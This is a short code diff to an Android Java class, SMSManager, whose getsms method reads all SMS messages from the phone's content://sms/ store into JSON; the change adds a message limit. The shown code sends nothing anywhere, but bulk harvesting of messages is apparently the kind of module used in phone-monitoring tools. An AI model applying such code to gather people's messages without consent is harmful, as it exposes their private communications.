@@ -17,11 +17,12 @@ import java.util.Locale;
 
 public class SMSManager {
 
-    public static JSONObject getsms()  {
+    public static JSONObject getsms(int limit)  {
         JSONObject result = null;
         JSONArray jarray = null;
 
         try {
+            int l = 1;
             jarray = new JSONArray();
             result = new JSONObject();
             Uri uri = Uri.parse("content://sms/");
@@ -33,8 +34,6 @@ public class SMSManager {
             if(c.moveToFirst()) {
 
                 for(int i=0; i < c.getCount(); i++) {
-
-
                     result.put("body",c.getString(c.getColumnIndexOrThrow("body")).toString());
                     long date = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString());
                     String dateTime = new SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.ENGLISH).format(new Date(date));
@@ -61,6 +60,11 @@ public class SMSManager {
                     result = new JSONObject();
 
                     c.moveToNext();
+
+                    l++;
+                    if (l > limit){
+                        break;
+                    }
                 }
             }
             c.close();
